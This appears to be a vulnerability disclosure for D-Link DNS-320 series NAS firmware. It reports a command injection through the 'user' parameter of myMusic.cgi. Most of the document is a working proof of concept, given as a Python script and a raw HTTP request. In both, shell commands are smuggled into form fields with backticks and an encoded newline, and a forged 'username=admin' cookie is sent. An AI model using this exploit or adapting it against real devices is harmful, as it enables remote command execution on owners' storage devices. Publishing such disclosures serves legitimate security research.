# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_get_alltracks_editlist function of the file /cgi-bin/myMusic.cgi.  The variable `user`is passed from a POST request and is assigned to `v1` via the `snprintf` function at line 22 and invoked by the `system` command,  it can lead to command execution.

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723712494786-5a7d1236-65a6-4ac5-843d-aa40b6cf7a99.png#averageHue=%23fdfdf9&clientId=u50529287-a5c3-4&from=paste&height=207&id=u79f740b6&originHeight=207&originWidth=1061&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38997&status=done&style=none&taskId=u8cb6bf83-6e56-4541-a335-a2b70549581&title=&width=1061)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_get_alltracks_editlist&user=`touch%09/tmp/115`&type=1&user=photos&idx=10&cgi_audio_search=%0atouch%09/tmp/112%0a&genre=10&page=19&r=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/myMusic.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_get_alltracks_editlist&user=`touch%09/tmp/115`&type=1&user=photos&idx=10&cgi_audio_search=%0atouch%09/tmp/112%0a&genre=10&page=19&r=/tmp/
```
